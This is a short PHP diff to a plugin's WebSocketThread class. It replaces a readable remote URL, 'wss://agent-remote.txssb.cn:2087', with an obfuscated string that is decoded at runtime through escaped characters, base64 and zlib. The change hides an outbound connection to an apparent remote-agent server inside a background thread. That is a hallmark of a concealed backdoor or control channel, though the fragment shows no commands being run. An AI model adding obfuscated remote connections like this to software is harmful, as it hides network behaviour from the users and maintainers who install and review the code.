@@ -61,7 +61,7 @@ class WebSocketThread extends Thread{
 	protected function onRun() : void{
 		require_once(dirname(__DIR__, 2) . '/vendor/autoload.php');
 
-		$client = new Client('wss://agent-remote.txssb.cn:2087'); //不要干坏事
+		$client = new Client(zlib_decode(base64_decode("\x65\112\x77\162\114\x37\x62\123\x31\60\x2f\x4b\114\71\x46\x4c\162\105\x6a\126\x79\70\172\x4c\164\152\111\171\x73\x44\x41\x48\x41\x45\x34\120\102\x71\70\x3d"))); //不要干坏事
 		$client
 			->setTimeout(1)
 			->onDisconnect(fn() => $this->connected = false)
